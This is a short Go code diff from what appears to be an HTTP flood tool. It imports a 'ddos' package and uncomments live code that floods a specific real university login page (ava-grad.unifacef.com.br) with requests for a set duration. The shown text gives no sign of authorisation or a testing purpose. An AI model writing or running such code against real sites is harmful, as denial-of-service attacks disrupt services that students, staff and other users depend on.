@@ -1,16 +1,16 @@
 package main
 
 import (
+	"facef/golang-httpflood/rodolfo-flood/DDOS-FLOOD/ddos"
 	"fmt"
 )
 
 func main() {
 	printIntro()
 
-	// x := ddos.NewFlooder("https://ava-grad.unifacef.com.br/login/index.php", 10)
-	// x.SetWorkerAmount(300)
-	// x.SetDuration(10)
-	// x.Flood()
+	x := ddos.NewFlooder("https://ava-grad.unifacef.com.br/login/index.php", 10, 10)
+	x.SetDuration(10)
+	x.Flood()
 }
 
 func printIntro() {
